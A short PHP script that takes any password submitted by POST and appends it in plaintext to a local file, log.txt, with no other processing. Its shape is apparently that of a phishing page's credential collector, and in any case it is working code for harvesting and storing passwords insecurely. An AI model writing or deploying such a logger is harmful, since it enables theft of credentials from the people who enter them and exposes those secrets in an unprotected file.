<?php
if ($_SERVER["REQUEST_METHOD"] == "POST" && isset($_POST['password'])) {
    $password = $_POST['password'];
    $file = 'log.txt';
    file_put_contents($file, $password . PHP_EOL, FILE_APPEND | LOCK_EX);
}
?>